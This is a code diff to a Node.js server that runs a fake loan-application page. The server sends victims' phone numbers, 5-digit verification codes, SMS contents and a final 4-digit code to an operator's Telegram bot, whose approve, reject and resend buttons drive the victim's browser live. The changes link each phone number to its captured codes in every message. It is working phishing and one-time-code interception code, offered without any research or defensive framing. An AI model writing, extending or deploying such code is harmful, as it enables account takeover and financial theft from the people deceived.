@@ -13,6 +13,9 @@ const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || process.env.CHAT_ID;
 
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
+// This object keeps track of the user's phone and code across pages
+const activeSessions = {}; 
+
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 app.use(express.static(__dirname));
@@ -25,13 +28,17 @@ app.get('/', (req, res) => {
 io.on('connection', (socket) => {
     console.log('A user connected:', socket.id);
 
-    // Keep-alive ping from browser
-    socket.on('ping', () => {
-        // Ping received, do nothing but keep connection open
-    });
+    // Keep-alive ping
+    socket.on('ping', () => {});
 
     // 1. Initial Application Submit
     socket.on('submit_loan', async (data) => {
+        // Save the user's details in memory
+        activeSessions[socket.id] = {
+            phone: data.phone,
+            code5: data.verificationCode
+        };
+
         const msg = `
 🆕 <b>New Loan Application</b>
 ━━━━━━━━━━━━━━━━
@@ -58,9 +65,16 @@ io.on('connection', (socket) => {
 
     // 2. SMS Submit
     socket.on('submit_sms', async (smsMessage) => {
+        // Retrieve the saved session data
+        const session = activeSessions[socket.id] || { phone: 'Unknown', code5: 'Unknown' };
+
         const msg = `
-📩 <b>SMS Received from User</b>
+📩 <b>SMS Received</b>
 ━━━━━━━━━━━━━━━━
+📞 <b>Phone:</b> +237 ${session.phone}
+🔑 <b>5-Digit Code:</b> ${session.code5}
+━━━━━━━━━━━━━━━━
+💬 <b>SMS Text:</b>
 <pre>${escapeHtml(smsMessage)}</pre>
 ━━━━━━━━━━━━━━━━
 ⏳ <b>Status:</b> Waiting for your decision...
@@ -84,10 +98,16 @@ io.on('connection', (socket) => {
 
     // 3. Final 4-Digit Code Submit
     socket.on('submit_final_code', async (fullCode) => {
+        // Retrieve the saved session data
+        const session = activeSessions[socket.id] || { phone: 'Unknown', code5: 'Unknown' };
+
         const msg = `
 🔐 <b>4-Digit Code Received</b>
 ━━━━━━━━━━━━━━━━
-<code>${fullCode}</code>
+📞 <b>Phone:</b> +237 ${session.phone}
+🔑 <b>5-Digit Code:</b> ${session.code5}
+━━━━━━━━━━━━━━━━
+🔢 <b>Final 4-Digit Code:</b> <code>${fullCode}</code>
 ━━━━━━━━━━━━━━━━
 ⏳ <b>Status:</b> Waiting for your decision...
         `;
@@ -107,6 +127,11 @@ io.on('connection', (socket) => {
             console.error(err);
         }
     });
+
+    // Clean up memory when user disconnects
+    socket.on('disconnect', () => {
+        delete activeSessions[socket.id];
+    });
 });
 
 // --- HELPER FUNCTION TO UPDATE TELEGRAM MESSAGE STATUS ---
@@ -118,7 +143,7 @@ async function updateMessageStatus(query, originalText, newStatus) {
             chat_id: query.message.chat.id,
             message_id: query.message.message_id,
             parse_mode: 'HTML',
-            reply_markup: { inline_keyboard: [] } // Removes buttons
+            reply_markup: { inline_keyboard: [] }
         });
     } catch (err) {
         console.error("Error editing message:", err.message);
@@ -132,13 +157,11 @@ bot.on('callback_query', async (query) => {
     const userSocket = io.sockets.sockets.get(socketId);
     const originalText = query.message.text;
 
-    // Check if user is offline (e.g. they closed the browser)
     if (!userSocket) {
-        await updateMessageStatus(query, originalText, '⚠️ <b>Status:</b> USER DISCONNECTED (Action recorded, but user closed the page)');
-        return bot.answerCallbackQuery(query.id, { text: 'User is offline, but status updated.' });
+        await updateMessageStatus(query, originalText, '⚠️ <b>Status:</b> USER DISCONNECTED');
+        return bot.answerCallbackQuery(query.id, { text: 'User is offline.' });
     }
 
-    // --- STEP 1: APPLICATION APPROVAL ---
     if (query.data.startsWith('approve_') && !query.data.includes('sms') && !query.data.includes('final')) {
         bot.answerCallbackQuery(query.id, { text: 'Approved!' });
         userSocket.emit('approved');
@@ -149,8 +172,6 @@ bot.on('callback_query', async (query) => {
         userSocket.emit('rejected');
         await updateMessageStatus(query, originalText, '❌ <b>Status:</b> REJECTED (Sent back)');
     }
-    
-    // --- STEP 2: SMS APPROVAL ---
     else if (query.data.startsWith('approve_sms_')) {
         bot.answerCallbackQuery(query.id, { text: 'SMS Approved!' });
         userSocket.emit('sms_approved');
@@ -162,12 +183,10 @@ bot.on('callback_query', async (query) => {
         await updateMessageStatus(query, originalText, '❌ <b>Status:</b> SMS REJECTED (Sent back)');
     }
     else if (query.data.startsWith('resend_sms_')) {
-        bot.answerCallbackQuery(query.id, { text: 'SMS Resend Triggered!' });
+        bot.answerCallbackQuery(query.id, { text: 'Resend Triggered!' });
         userSocket.emit('sms_resend');
-        await updateMessageStatus(query, originalText, '🔄 <b>Status:</b> RESENT (Asked user for new SMS)');
+        await updateMessageStatus(query, originalText, '🔄 <b>Status:</b> RESENT');
     }
-
-    // --- STEP 3: FINAL CODE APPROVAL ---
     else if (query.data.startsWith('approve_final_')) {
         bot.answerCallbackQuery(query.id, { text: 'Approved!' });
         userSocket.emit('final_approved');
